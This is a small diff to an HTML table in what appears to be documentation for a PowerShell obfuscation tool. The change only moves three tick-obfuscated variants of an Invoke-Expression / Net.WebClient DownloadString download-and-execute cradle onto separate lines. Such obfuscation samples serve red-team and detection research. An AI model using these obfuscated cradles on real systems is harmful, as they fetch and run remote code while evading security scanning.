@@ -57,7 +57,9 @@ you can copy the results from all cases for one or more obfuscation methods and 
    <td align="center">1</td>
    <td align="center">TOKEN\COMMAND\1</td>
    <td align="center"> 
-      inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString<br/>InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString<br/>I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString
+      inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString
+      InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString
+      I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString
    </td>
    <td align="left">This option basicaly applies ticks</td>
  </tr>
